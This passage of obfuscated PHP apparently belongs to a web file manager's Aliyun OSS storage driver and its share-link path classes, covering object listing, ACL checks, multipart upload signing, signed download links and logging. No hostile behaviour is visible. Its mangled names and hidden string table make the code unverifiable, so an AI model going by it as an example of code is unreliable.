$æ¦†˜”Ã = rtrim($æ¦†˜”Ã, $ŞÎò½Úô[8]) . $ŞÎò½Úô[8]; $ªøßÑÚ› = $this->objectMeta($æ¦†˜”Ã); if (!$ªøßÑÚ›) { return $ŠİÄôú’; } $¢ÒÙõÂ‡ = array($ŞÎò½Úô[231] => $ªøßÑÚ›[$ŞÎò½Úô[575]][$ŞÎò½Úô[1459]], $ŞÎò½Úô[88] => strtotime($ªøßÑÚ›[$ŞÎò½Úô[1456]])); } if (isset($¢ÒÙõÂ‡[$ŞÎò½Úô[88]])) { $ŠİÄôú’[$ŞÎò½Úô[88]] = $¢ÒÙõÂ‡[$ŞÎò½Úô[88]]; } if (isset($¢ÒÙõÂ‡[$ŞÎò½Úô[231]])) { $ŠİÄôú’[$ŞÎò½Úô[231]] = $¢ÒÙõÂ‡[$ŞÎò½Úô[231]]; } return $ŠİÄôú’; } public function listPath($ò°ÕÅûì, $İÀÓ‡­İ = false) { $“Ôè´ï =& $_SERVER[ìïæ“œî]; $Ê¦¯¾«Ñ = $this->fileList($ò°ÕÅûì, $“Ôè´ï[8], !0); foreach ($Ê¦¯¾«Ñ[$“Ôè´ï[85]] as $şâÉ“Ş => $å–Áõ”) { $Ê¦¯¾«Ñ[$“Ôè´ï[85]][$şâÉ“Ş] = $this->folderInfo($å–Áõ”, $İÀÓ‡­İ, $å–Áõ”); } foreach ($Ê¦¯¾«Ñ[$“Ôè´ï[86]] as $şâÉ“Ş => $å–Áõ”) { $Ê¦¯¾«Ñ[$“Ôè´ï[86]][$şâÉ“Ş] = $this->fileInfo($å–Áõ”[$“Ôè´ï[32]], $İÀÓ‡­İ, $å–Áõ”); } return $Ê¦¯¾«Ñ; } protected function infoChildren($ôÁ‡ò°’, &$©ÒßÆ´) { $´ªÅş­Ü =& $_SERVER[ìïæ“œî]; $¿˜õ”óù = $this->fileList($ôÁ‡ò°’, $´ªÅş­Ü[12], !0); $©ÒßÆ´[$´ªÅş­Ü[81]] += count($¿˜õ”óù[$´ªÅş­Ü[85]]); $©ÒßÆ´[$´ªÅş­Ü[80]] += count($¿˜õ”óù[$´ªÅş­Ü[86]]); foreach ($¿˜õ”óù[$´ªÅş­Ü[86]] as $Æ²©ô±Ô) { if (!$Æ²©ô±Ô || !$Æ²©ô±Ô[$´ªÅş­Ü[79]]) { continue; } $©ÒßÆ´[$´ªÅş­Ü[79]] += $Æ²©ô±Ô[$´ªÅş­Ü[79]]; } } public function has($ÆéÖ›ù, $¥øò“ ² = false, $ÓŒµ„ï = true) { $Õİ…Û¹¤ =& $_SERVER[ìïæ“œî]; $ÆéÖ›ù = trim($ÆéÖ›ù, $Õİ…Û¹¤[8]); $¾ÌÅâò = empty($ÆéÖ›ù) && $ÆéÖ›ù !== $Õİ…Û¹¤[228] ? $Õİ…Û¹¤[12] : $ÆéÖ›ù . $Õİ…Û¹¤[8]; $”·®†® = $Õİ…Û¹¤[12]; $ø­•³ÜÖ = 500; $ªğÎ±û± = $‡Ò±õÜ¶ = 0; while (!0) { check_abort(); $ÅøšÁ§å = array($Õİ…Û¹¤[1450] => $Õİ…Û¹¤[8], $Õİ…Û¹¤[1451] => $¾ÌÅâò, $Õİ…Û¹¤[1452] => $ø­•³ÜÖ, $Õİ…Û¹¤[1453] => $”·®†®); try { $ÚÌ‰¦€Ï = $this->client->listObjects($this->bucket, $ÅøšÁ§å); } catch (OSS\Core\OssException $Ã¥‹¹õ¥) { $this->writeLog(__FUNCTION__ . $Õİ…Û¹¤[214] . $Ã¥‹¹õ¥->getMessage()); break; } $”·®†® = $ÚÌ‰¦€Ï->getNextMarker(); $Ã¿ì›Ú£ = $ÚÌ‰¦€Ï->getObjectList(); $‘½¢ò™Ï = $ÚÌ‰¦€Ï->getPrefixList(); if ($¥øò“ ²) { if (count($Ã¿ì›Ú£) > 1 || count($Ã¿ì›Ú£) == 1 && $Ã¿ì›Ú£[0]->getKey() != $¾ÌÅâò) { $ªğÎ±û± += count($Ã¿ì›Ú£) - 1; } if (!empty($‘½¢ò™Ï)) { $‡Ò±õÜ¶ += count($‘½¢ò™Ï); } if ($”·®†® === $Õİ…Û¹¤[12]) { break; } continue; } if ($ÓŒµ„ï) { if (!empty($Ã¿ì›Ú£)) { if (count($Ã¿ì›Ú£) > 1 || $Ã¿ì›Ú£[0]->getKey() != $¾ÌÅâò) { return !0; } } } else { if (!empty($‘½¢ò™Ï)) { return !0; } } if ($”·®†® === $Õİ…Û¹¤[12]) { break; } } if ($¥øò“ ²) { return array($Õİ…Û¹¤[239] => $ªğÎ±û±, $Õİ…Û¹¤[240] => $‡Ò±õÜ¶); } return !1; } public function listAll($ÁéÁÁÛ²) { $À¤Şˆ«ƒ =& $_SERVER[ìïæ“œî]; $íæ¨şê¢ = $this->fileList($ÁéÁÁÛ², $À¤Şˆ«ƒ[12], !0); $ÃåÕ‹ËÄ = array_to_keyvalue($íæ¨şê¢[$À¤Şˆ«ƒ[86]], $À¤Şˆ«ƒ[32]); foreach ($íæ¨şê¢[$À¤Şˆ«ƒ[85]] as $íƒ¨æõ”) { if (is_string($íƒ¨æõ”)) { $ÃåÕ‹ËÄ[$íƒ¨æõ”] = array($À¤Şˆ«ƒ[79] => 0); } } return $this->listAllFiles($ÁéÁÁÛ², $ÃåÕ‹ËÄ); } public function canRead($ğÂô«¹•) { $•Æƒ˜µ =& $_SERVER[ìïæ“œî]; $çÜ«ÊÉ­ = $this->pathAcl($ğÂô«¹•); return $çÜ«ÊÉ­ == $•Æƒ˜µ[1460] || $çÜ«ÊÉ­ == $•Æƒ˜µ[619] ? !0 : !1; } public function canWrite($ÎŠëéØ´) { $¼­¥üÔº = $this->pathAcl($ÎŠëéØ´); return $¼­¥üÔº == $_SERVER[ìïæ“œî][619] ? !0 : !1; } public function pathAcl($¤’Ì”Øä) { $û¶Ó˜û =& $_SERVER[ìïæ“œî]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $è™Šò„¢ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¤’Ì”Øä)); } catch (OSS\Core\OssException $ ×¯ÒŒ³) { $this->writeLog(__FUNCTION__ . $û¶Ó˜û[214] . $ ×¯ÒŒ³->getMessage()); return !1; } $¼ÒÏñé± = $è™Šò„¢ == $û¶Ó˜û[37] ? $this->bucketAcl : $è™Šò„¢; if ($¼ÒÏñé± == $û¶Ó˜û[1461]) { return $û¶Ó˜û[1460]; } if ($¼ÒÏñé± == $û¶Ó˜û[1462]) { return $û¶Ó˜û[619]; } return $¼ÒÏñé±; } private function chmodPath($ÅÕ—ë °, $Ü°’¶» = '') { $î¨ÏÖ‡ =& $_SERVER[ìïæ“œî]; $±ìƒõÏ² = empty($Ü°’¶») ? $î¨ÏÖ‡[1462] : $Ü°’¶»; $Ö®Ş½ = array($î¨ÏÖ‡[37], $î¨ÏÖ‡[229], $î¨ÏÖ‡[1461], $î¨ÏÖ‡[1462]); if (!in_array($±ìƒõÏ², $Ö®Ş½)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ÅÕ—ë °), $±ìƒõÏ²); } catch (OSS\Core\OssException $Ïì—º†İ) { $this->writeLog(__FUNCTION__ . $î¨ÏÖ‡[214] . $Ïì—º†İ->getMessage()); return !1; } return !0; } public function getContent($À’¢…‘«) { return $this->fileSubstr($À’¢…‘«, -1); } public function setContent($¡Ô‡ÚÄ¯, $×Ë†£Ú× = '') { $ßèÀ¢‡Ø =& $_SERVER[ìïæ“œî]; try { $£›×—Ó = $this->trafficLimit($ßèÀ¢‡Ø[1463]); $¸Š‡÷¢ = $this->client->putObject($this->bucket, $this->pathEncode($¡Ô‡ÚÄ¯), $×Ë†£Ú×, $£›×—Ó); } catch (OSS\Core\OssException $ÂÆü„à) { $this->writeLog(__FUNCTION__ . $ßèÀ¢‡Ø[214] . $ÂÆü„à->getMessage()); return !1; } $¨ê„©Æ½ = array($ßèÀ¢‡Ø[1457] => trim($¸Š‡÷¢[$ßèÀ¢‡Ø[1454]], $ßèÀ¢‡Ø[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¡Ô‡ÚÄ¯))); $this->updateObjMeta($¡Ô‡ÚÄ¯, $¨ê„©Æ½); return isset($¸Š‡÷¢[$ßèÀ¢‡Ø[1464]][$ßèÀ¢‡Ø[292]]) ? !0 : !1; } private function updateObjMeta($³Šƒ‚éš, $Åàç“³) { $³Šƒ‚éš = $this->pathEncode($³Šƒ‚éš); try { $°¬şìÅ§ = array(OSS\OssClient::OSS_HEADERS => $Åàç“³); $this->client->copyObject($this->bucket, $³Šƒ‚éš, $this->bucket, $³Šƒ‚éš, $°¬şìÅ§); } catch (OSS\Core\OssException $ÆÚ¯õ±) { $this->writeLog(__FUNCTION__ . $_SERVER[ìïæ“œî][214] . $ÆÚ¯õ±->getMessage()); return !1; } return !0; } public function upload($ªÆ¨ˆí¸, $Ş§Ö¸Æå, $ÀÏ«îßé = false, $âé†¨õ÷ = REPEAT_REPLACE) { $À±½ÊÅ =& $_SERVER[ìïæ“œî]; $ŸãË»‡ˆ = trim($ªÆ¨ˆí¸, $À±½ÊÅ[8]); $©¹Åî = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($À±½ÊÅ[1457] => @md5_file($Ş§Ö¸Æå)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ªÆ¨ˆí¸))); $©¹Åî = $this->trafficLimit($À±½ÊÅ[1463], $©¹Åî); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ŸãË»‡ˆ), $Ş§Ö¸Æå, $©¹Åî); } catch (OSS\Core\OssException $ ½™ü†) { $this->writeLog(__FUNCTION__ . $À±½ÊÅ[214] . $ ½™ü†->getMessage()); return !1; } return $this->getPathOuter($ªÆ¨ˆí¸); } public function getHost() { $ÚÓ¯å¾º =& $_SERVER[ìïæ“œî]; $—•Â±àÏ = explode($ÚÓ¯å¾º[210], parent::getHost()); return $—•Â±àÏ[0] . $ÚÓ¯å¾º[210] . $this->bucket . $ÚÓ¯å¾º[10] . $—•Â±àÏ[1]; } public function uploadFormData($Ö÷Ô·Ç, $º’•”´À = 3600) { $Èä ï‰ =& $_SERVER[ìïæ“œî]; if (!($”è¥ş†å = $this->getHost())) { return !1; } $àø–•ï = $º’•”´À; $ŠÌÛû = date($Èä ï‰[1465], time() + $àø–•ï); $óëÆŒ· = new DateTime($ŠÌÛû); $µ¡ØÛ×ã = $óëÆŒ·->format(DateTime::ISO8601); $£í¨úüŸ = strpos($µ¡ØÛ×ã, $Èä ï‰[372]); $µ¡ØÛ×ã = substr($µ¡ØÛ×ã, 0, $£í¨úüŸ) . $Èä ï‰[1466]; $‘­ÛË = 1048576000 * 5; $ï£·†ÁÃ = $this->pathFather($Ö÷Ô·Ç); $âü¼¸…¢ = array($Èä ï‰[275] => $µ¡ØÛ×ã, $Èä ï‰[278] => array(array($Èä ï‰[1467], 0, $‘­ÛË), array($Èä ï‰[281], $Èä ï‰[282], $ï£·†ÁÃ))); $ÕåíÉİ× = base64_encode(json_encode($âü¼¸…¢)); $óÂ–ºÔ” = base64_encode(hash_hmac($Èä ï‰[263], $ÕåíÉİ×, $this->secret, !0)); $ŒÑêí¹ = array($Èä ï‰[293] => $ÕåíÉİ×, $Èä ï‰[1468] => $this->accessKey, $Èä ï‰[285] => $Èä ï‰[274], $Èä ï‰[1469] => $óÂ–ºÔ”, $Èä ï‰[208] => $”è¥ş†å); $ŒÑêí¹ = $this->trafficLimit($Èä ï‰[1463], $ŒÑêí¹); return $ŒÑêí¹; } public function multiUploadFormData($Ø¶€ôëë, $¢ÈÚİş³ = 3600) { $ÑÓùÙ¦Û =& $_SERVER[ìïæ“œî]; if (!($òßßŸöÓ = $this->getHost())) { return !1; } $³ß’í = $this->trafficLimit($ÑÓùÙ¦Û[1463]); $“œËÎÃä = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ø¶€ôëë), $³ß’í); return array($ÑÓùÙ¦Û[254] => $“œËÎÃä, $ÑÓùÙ¦Û[208] => $òßßŸöÓ . $ÑÓùÙ¦Û[8] . $this->pathEncode($Ø¶€ôëë), $ÑÓùÙ¦Û[255] => gmdate($ÑÓùÙ¦Û[1470]), $ÑÓùÙ¦Û[97] => $Ø¶€ôëë); } public function multiUploadAuthData($úÇØ»¸Ï, $¥’Ç”Ø = array()) { $öˆ¯ƒ‹Ê =& $_SERVER[ìïæ“œî]; $¹àÈ¾”ı = isset($¥’Ç”Ø[$öˆ¯ƒ‹Ê[255]]) ? $¥’Ç”Ø[$öˆ¯ƒ‹Ê[255]] : gmdate($öˆ¯ƒ‹Ê[1470]); $Úæè¬¯‘ = isset($¥’Ç”Ø[$öˆ¯ƒ‹Ê[169]]) ? $¥’Ç”Ø[$öˆ¯ƒ‹Ê[169]] : $öˆ¯ƒ‹Ê[12]; $˜‡û”¯ = $úÇØ»¸Ï; if (isset($¥’Ç”Ø[$öˆ¯ƒ‹Ê[97]])) { $˜‡û”¯ = $¥’Ç”Ø[$öˆ¯ƒ‹Ê[97]]; unset($¥’Ç”Ø[$öˆ¯ƒ‹Ê[97]]); } if (isset($¥’Ç”Ø[$öˆ¯ƒ‹Ê[256]])) { $¥’Ç”Ø[$öˆ¯ƒ‹Ê[255]] = $¹àÈ¾”ı; return $this->listUploadParts($˜‡û”¯, $¥’Ç”Ø); } $ÅÂèäğ = array($öˆ¯ƒ‹Ê[257], $öˆ¯ƒ‹Ê[12], $öˆ¯ƒ‹Ê[123], $¹àÈ¾”ı, "\x78\55\x6f\x73\163\x2d\144\141\164\145\72{$¹àÈ¾”ı}", $öˆ¯ƒ‹Ê[8] . $this->bucket . $öˆ¯ƒ‹Ê[8] . $˜‡û”¯ . $Úæè¬¯‘); if (strpos($Úæè¬¯‘, $öˆ¯ƒ‹Ê[258]) === 0) { $ÅÂèäğ[0] = $öˆ¯ƒ‹Ê[259]; if ($…Ã¼–ŒÛ = $this->trafficLimit($öˆ¯ƒ‹Ê[1463])) { $˜‡û”¯ = $öˆ¯ƒ‹Ê[1471]; array_splice($ÅÂèäğ, 5, 0, $˜‡û”¯ . $öˆ¯ƒ‹Ê[4] . $…Ã¼–ŒÛ[$˜‡û”¯]); } } if (isset($¥’Ç”Ø[$öˆ¯ƒ‹Ê[260]]) && $¥’Ç”Ø[$öˆ¯ƒ‹Ê[260]] == $öˆ¯ƒ‹Ê[261]) { $ÅÂèäğ[0] = $öˆ¯ƒ‹Ê[261]; } if (!empty($¥’Ç”Ø[$öˆ¯ƒ‹Ê[1472]])) { $¯áàÚµ¥ = array_merge(array($ÅÂèäğ[4]), $¥’Ç”Ø[$öˆ¯ƒ‹Ê[1472]]); sort($¯áàÚµ¥); $ÅÂèäğ[4] = implode($öˆ¯ƒ‹Ê[262], $¯áàÚµ¥); } $¯¹Øœ˜ = implode($öˆ¯ƒ‹Ê[262], $ÅÂèäğ); $œã‡§·‘ = base64_encode(hash_hmac($öˆ¯ƒ‹Ê[263], $¯¹Øœ˜, $this->secret, !0)); $‹‘”Ã‚ = $öˆ¯ƒ‹Ê[1440] . $this->accessKey . $öˆ¯ƒ‹Ê[4] . $œã‡§·‘; if (strpos($Úæè¬¯‘, $öˆ¯ƒ‹Ê[258]) === 0) { $‹‘”Ã‚ = array($öˆ¯ƒ‹Ê[265] => $‹‘”Ã‚, $öˆ¯ƒ‹Ê[255] => $¹àÈ¾”ı); if ($…Ã¼–ŒÛ) { $‹‘”Ã‚ = array_merge($‹‘”Ã‚, $…Ã¼–ŒÛ); } } return $‹‘”Ã‚; } public function listUploadParts($‹â¤Í’Ô, $•ßí¸ğ’) { $¦äİâ­ =& $_SERVER[ìïæ“œî]; $Ùé¿ûˆ = parse_url_query($•ßí¸ğ’[$¦äİâ­[169]]); $®Ì¬š°Î = $this->client->listParts($this->bucket, $this->pathEncode($‹â¤Í’Ô), $Ùé¿ûˆ[$¦äİâ­[254]]); $Ÿ³İÉÈÛ = $®Ì¬š°Î->getListPart(); $‹¬¡‘¹ = array(); foreach ($Ÿ³İÉÈÛ as $Çşîº¬ã) { $‹¬¡‘¹[] = array($¦äİâ­[308] => $Çşîº¬ã->getPartNumber(), $¦äİâ­[309] => trim($Çşîº¬ã->getETag(), $¦äİâ­[121])); } unset($•ßí¸ğ’[$¦äİâ­[256]], $•ßí¸ğ’[$¦äİâ­[260]]); $÷êßÖ‚½ = $this->multiUploadAuthData($‹â¤Í’Ô, $•ßí¸ğ’); if (empty($÷êßÖ‚½)) { return !1; } return array($¦äİâ­[265] => $÷êßÖ‚½, $¦äİâ­[255] => $•ßí¸ğ’[$¦äİâ­[255]], $¦äİâ­[267] => $‹¬¡‘¹); } public function download($Ÿ¦ëõª, $ó¯¬’øÜ) { $¢ÄÚâ­€ =& $_SERVER[ìïæ“œî]; if ($this->isFolder($Ÿ¦ëõª)) { return !1; } try { $ü„ƒ“Ë = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ó¯¬’øÜ); $ü„ƒ“Ë = $this->trafficLimit($¢ÄÚâ­€[112], $ü„ƒ“Ë); $this->client->getObject($this->bucket, $this->pathEncode($Ÿ¦ëõª), $ü„ƒ“Ë); } catch (OSS\Core\OssException $ˆ×øÃû) { $this->writeLog(__FUNCTION__ . $¢ÄÚâ­€[214] . $ˆ×øÃû->getMessage()); return !1; } return $ó¯¬’øÜ; } public function fileSubstr($¯´å®·, $ƒ²Ï¼Ãà = 0, $…¾ø¯®Î = false) { if ($ƒ²Ï¼Ãà === -1) { $Ú™îå— = array(); } else { if ($…¾ø¯®Î === !1) { $ººŞíùã = $this->size($¯´å®·); } else { $ººŞíùã = $ƒ²Ï¼Ãà + $…¾ø¯®Î - 1; } $Ú™îå— = array(OSS\OssClient::OSS_RANGE => "{$ƒ²Ï¼Ãà}\x2d{$ººŞíùã}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($¯´å®·), $Ú™îå—); } catch (OSS\Core\OssException $Ê¥›ˆã) { $this->writeLog(__FUNCTION__ . $_SERVER[ìïæ“œî][214] . $Ê¥›ˆã->getMessage()); think_exception($Ê¥›ˆã->getMessage()); return !1; } } private function trafficLimit($ÜÌñ¼±á, $²ÊèÛŞ = array()) { $‹™‰çş =& $_SERVER[ìïæ“œî]; if ($ÜÌñ¼±á == $‹™‰çş[1463] && $this->isUploadServer() || $ÜÌñ¼±á == $‹™‰çş[112] && $this->isFileOutServer()) { return $²ÊèÛŞ; } $­•ØÊÑğ = floatval($GLOBALS[$‹™‰çş[6]][$‹™‰çş[92]][$‹™‰çş[110]][$ÜÌñ¼±á]) * 1024 * 1024 * 8; if (!$­•ØÊÑğ) { return $²ÊèÛŞ; } $­•ØÊÑğ = $­•ØÊÑğ < 819200 ? 819200 : ($­•ØÊÑğ > 838860800 ? 838860800 : $­•ØÊÑğ); $²ÊèÛŞ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($­•ØÊÑğ); return $²ÊèÛŞ; } public function link($–ôª¾é, $–åÊ‹…Ì = array()) { $¥Êñ“­ =& $_SERVER[ìïæ“œî]; if (!$this->exist($–ôª¾é) || $this->isFolder($–ôª¾é)) { return !1; } try { $–åÊ‹…Ì = $this->trafficLimit($¥Êñ“­[112], $–åÊ‹…Ì); $ùüº–ñË = $this->client->signUrl($this->bucket, $this->pathEncode($–ôª¾é), 3600 * 12, $¥Êñ“­[261], $–åÊ‹…Ì); return $this->getCdnLink($ùüº–ñË); } catch (OSS\Core\OssException $ÉË¹À†Ç) { $this->writeLog(__FUNCTION__ . $¥Êñ“­[214] . $ÉË¹À†Ç->getMessage()); return !1; } } public function fileOut($İõË·€Ì, $‡½ƒìêì = false, $•õñø¬ = false, $ø¥ŠãÈì = '') { $Õ«âà =& $_SERVER[ìïæ“œî]; if ($this->isFileOutServer()) { return $this->fileOutServer($İõË·€Ì, $‡½ƒìêì, $•õñø¬, $ø¥ŠãÈì); } if (!$•õñø¬) { $•õñø¬ = $this->pathThis($İõË·€Ì); } $•õñø¬ = rawurlencode($•õñø¬); $ø÷¨ïûÌ = get_file_mime(get_path_ext($•õñø¬)); if ($ø÷¨ïûÌ == $Õ«âà[248]) { return parent::fileOut($İõË·€Ì, $‡½ƒìêì, $•õñø¬, $ø¥ŠãÈì); } $‡½ƒìêì = $‡½ƒìêì ? $Õ«âà[1473] : $Õ«âà[1474]; $‘çı¡¶¤ = array(OSS\OssClient::OSS_SUB_RESOURCE => $Õ«âà[1475] . rawurlencode("{$‡½ƒìêì}\x3b\146\x69\x6c\145\156\141\155\x65\75{$•õñø¬}")); $‘çı¡¶¤[OSS\OssClient::OSS_SUB_RESOURCE] .= $Õ«âà[1476] . rawurlencode($ø÷¨ïûÌ); $†“øê¨ô = $this->link($İõË·€Ì, $‘çı¡¶¤); $this->fileOutLink($†“øê¨ô); } public function fileOutServer($¬§”´Á¦, $éÈËÀ½ş = false, $Ë’»â°ë = false, $êˆ†ÛÓ’ = '') { parent::fileOut($¬§”´Á¦, $éÈËÀ½ş, $Ë’»â°ë, $êˆ†ÛÓ’); } public function fileOutImage($“Î€à˜›, $…©³ùÔ… = 250) { if ($this->size($“Î€à˜›) > 1024 * 1024 * 20) { return $this->fileOutImageServer($“Î€à˜›, $…©³ùÔ…); } $ó…ï¼ã¬ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ìïæ“œî][1437] . $…©³ùÔ…); $”¥İ´ = $this->link($“Î€à˜›, $ó…ï¼ã¬); $this->fileOutLink($”¥İ´); } public function fileOutImageServer($ÄöÍÛê¬, $»öÓ§‡ø = 250) { parent::fileOutImage($ÄöÍÛê¬, $»öÓ§‡ø); } public function fileOutLink($åƒ¾¯ı») { $ÎâÑ¢ôµ =& $_SERVER[ìïæ“œî]; if (!$this->isCdnHost() && substr($åƒ¾¯ı», 0, 7) == $ÎâÑ¢ôµ[313]) { $åƒ¾¯ı» = $ÎâÑ¢ôµ[314] . substr($åƒ¾¯ı», 7); } header($ÎâÑ¢ôµ[175] . $åƒ¾¯ı»); die; } public function hashMd5($Î¯ªà®, $‡´Å«›Õ = '') { $’ÛÈ­¾Ş =& $_SERVER[ìïæ“œî]; $¯ôö ™ = $this->_objectMeta($Î¯ªà®); if (!$¯ôö ™) { return $’ÛÈ­¾Ş[12]; } if (!isset($¯ôö ™[$’ÛÈ­¾Ş[1457]]) && !empty($‡´Å«›Õ)) { $ë©œ‹Ö» = $this->updateObjMeta($Î¯ªà®, array($’ÛÈ­¾Ş[1457] => $‡´Å«›Õ)); $¯ôö ™[$’ÛÈ­¾Ş[1457]] = $ë©œ‹Ö» ? $‡´Å«›Õ : $’ÛÈ­¾Ş[12]; } return isset($¯ôö ™[$’ÛÈ­¾Ş[1457]]) ? strtolower($¯ôö ™[$’ÛÈ­¾Ş[1457]]) : $’ÛÈ­¾Ş[12]; } public function size($ôµ£ûŒ) { $şøşôÏ = $this->objectMeta($ôµ£ûŒ); return $şøşôÏ ? $şøşôÏ[$_SERVER[ìïæ“œî][79]] : 0; } public function info($õâï”äÂ) { if ($this->isFolder($õâï”äÂ)) { return $this->folderInfo($õâï”äÂ); } else { if ($this->isFile($õâï”äÂ)) { return $this->fileInfo($õâï”äÂ); } } return !1; } public function exist($ĞüÍ¬Ÿ) { return $this->isFile($ĞüÍ¬Ÿ) || $this->isFolder($ĞüÍ¬Ÿ); } public function isFile($“Á¥åû‚) { return !$this->isFolder($“Á¥åû‚) && $this->objectMeta($“Á¥åû‚); } public function isFolder($ãéí²ƒ™) { return $this->cacheMethod($_SERVER[ìïæ“œî][179], $ãéí²ƒ™); } protected function objectMeta($¢Úõà²•) { return $this->cacheMethod($_SERVER[ìïæ“œî][181], $¢Úõà²•); } protected function _objectMeta($Âû½Æ‘Ã) { $ù÷Ö‹ÎÕ =& $_SERVER[ìïæ“œî]; try { $ı¬İ’øì = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Âû½Æ‘Ã)); } catch (OSS\Core\OssException $Ò×úª ) { $this->writeLog(__FUNCTION__ . $ù÷Ö‹ÎÕ[214] . $Ò×úª ->getMessage()); $ı¬İ’øì = !1; } if ($ı¬İ’øì) { $ı¬İ’øì[$ù÷Ö‹ÎÕ[79]] = intval($ı¬İ’øì[$ù÷Ö‹ÎÕ[1455]]); } return $ı¬İ’øì; } protected function _isFolder($‚¾™ü¤æ) { $‹ê¼ÜÑ™ =& $_SERVER[ìïæ“œî]; if ($‚¾™ü¤æ == $‹ê¼ÜÑ™[12] || $‚¾™ü¤æ == $‹ê¼ÜÑ™[8]) { return !0; } $±·ÈÆù = array($‹ê¼ÜÑ™[1450] => $‹ê¼ÜÑ™[8], $‹ê¼ÜÑ™[1451] => rtrim($‚¾™ü¤æ, $‹ê¼ÜÑ™[8]) . $‹ê¼ÜÑ™[8], $‹ê¼ÜÑ™[1452] => 1, $‹ê¼ÜÑ™[1453] => $‹ê¼ÜÑ™[12]); $şñàëü = $this->client->listObjects($this->bucket, $±·ÈÆù); if ($şñàëü->getObjectList() || $şñàëü->getPrefixList()) { return !0; } return !1; } public function writeLog($¦¥—Şë¾ = '', $†”Ù˜î§ = false) { $‹Á§€¹ =& $_SERVER[ìïæ“œî]; $´ûç¯Äµ = in_array(ACTION, array($‹Á§€¹[212], $‹Á§€¹[213])); if (!$´ûç¯Äµ && !GLOBAL_DEBUG) { return; } $•ŒõÎ—ï = 0; if (stripos($¦¥—Şë¾, $‹Á§€¹[1477]) !== !1) { $•ŒõÎ—ï = 1; $ŒÔûŒÉô = explode($‹Á§€¹[1478], $¦¥—Şë¾); $¦¥—Şë¾ = !empty($ŒÔûŒÉô[1]) ? $ŒÔûŒÉô[1] : $¦¥—Şë¾; } else { if (stripos($¦¥—Şë¾, $‹Á§€¹[1479])) { $•ŒõÎ—ï = 2; $ŒÔûŒÉô = explode($‹Á§€¹[1479], $¦¥—Şë¾); $ŒÔûŒÉô = explode($‹Á§€¹[4], $ŒÔûŒÉô[0]); $¦¥—Şë¾ = !empty($ŒÔûŒÉô[1]) ? $ŒÔûŒÉô[1] : $¦¥—Şë¾; } } if ($´ûç¯Äµ && I18n::getType() == $‹Á§€¹[1480]) { if ($•ŒõÎ—ï == 1) { $¦¥—Şë¾ = str_replace($‹Á§€¹[1481], $‹Á§€¹[1482], $¦¥—Şë¾); } else { if ($•ŒõÎ—ï == 2) { $ŒÔûŒÉô = explode($‹Á§€¹[214], $ŒÔûŒÉô[0]); $ˆàõ— = isset($ŒÔûŒÉô[1]) ? $ŒÔûŒÉô[1] : $‹Á§€¹[12]; $•ë¯°Û› = array($‹Á§€¹[1483] => $‹Á§€¹[1484], $‹Á§€¹[1485] => $‹Á§€¹[1486], $‹Á§€¹[1487] => $‹Á§€¹[1488], $‹Á§€¹[1489] => $‹Á§€¹[1490], $‹Á§€¹[1491] => $‹Á§€¹[1492], $‹Á§€¹[1493] => $‹Á§€¹[1494], $‹Á§€¹[1495] => $‹Á§€¹[1496], $‹Á§€¹[1497] => $‹Á§€¹[1498], $‹Á§€¹[1499] => $‹Á§€¹[1500], $‹Á§€¹[1501] => $‹Á§€¹[1502]); if (isset($•ë¯°Û›[$ˆàõ—])) { $¦¥—Şë¾ = $•ë¯°Û›[$ˆàõ—]; } } } if (stripos($¦¥—Şë¾, $‹Á§€¹[1503])) { $¦¥—Şë¾ = $‹Á§€¹[1504]; } } if (!trim($¦¥—Şë¾)) { return; } parent::writeLog(trim($¦¥—Şë¾), $†”Ù˜î§); } } goto FŠÂÇàİ—; Fí‹ÆÅ˜æ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($·šÀ¯¢ñ) { $this->pathParse = $·šÀ¯¢ñ; $this->model = Model($_SERVER[ìïæ“œî][1394]); } protected function infoParse($š£¸Ñ®á, $Æ†­”´ = false, $‹ıÁ»“Ü = false) { $‚ĞŸ—îÂ =& $_SERVER[ìïæ“œî]; return Action($‚ĞŸ—îÂ[1233])->sharePathInfo($this->pathParse[$‚ĞŸ—îÂ[87]], !0, $Æ†­”´); } public function listPath($Îµš®Ò, $÷ÛƒÎüş = false) { $ĞÒÀÀ¹ =& $_SERVER[ìïæ“œî]; $—ĞÙÆå¾ = parent::listPath($Îµš®Ò, $÷ÛƒÎüş); if (!$—ĞÙÆå¾) { return $—ĞÙÆå¾; } if (is_array($—ĞÙÆå¾[$ĞÒÀÀ¹[1402]])) { $—ĞÙÆå¾[$ĞÒÀÀ¹[1402]] = Action($ĞÒÀÀ¹[1233])->shareItemInfo($—ĞÙÆå¾[$ĞÒÀÀ¹[1402]]); } foreach ($—ĞÙÆå¾ as $ÒŒ‚Öõ => $›«Èó†) { if (!in_array($ÒŒ‚Öõ, array($ĞÒÀÀ¹[86], $ĞÒÀÀ¹[85]))) { continue; } foreach ($›«Èó† as $‰­Ôó„Å => $”˜­¢ìõ) { $—ĞÙÆå¾[$ÒŒ‚Öõ][$‰­Ôó„Å] = Action($ĞÒÀÀ¹[1233])->shareItemInfo($”˜­¢ìõ); } } return $—ĞÙÆå¾; } public function listAll($½ööµ»Ë) { $¥«ßÛÇ =& $_SERVER[ìïæ“œî]; $Ö¾ƒ·‚ = IO::info($this->pathParse[$¥«ßÛÇ[87]]); if (!$Ö¾ƒ·‚) { return array(); } $¼¾­É£ö = $this->model->listAll($½ööµ»Ë); foreach ($¼¾­É£ö as &$¡µ½Ê’) { $¡µ½Ê’[$¥«ßÛÇ[90]] = Action($¥«ßÛÇ[1233])->shareItemInfo($¡µ½Ê’[$¥«ßÛÇ[90]]); } unset($¡µ½Ê’); return $¼¾­É£ö; } } class PathDriverDriverShareItem { public function __construct($¸¯ğÏ„Ñ) { $this->pathParse = 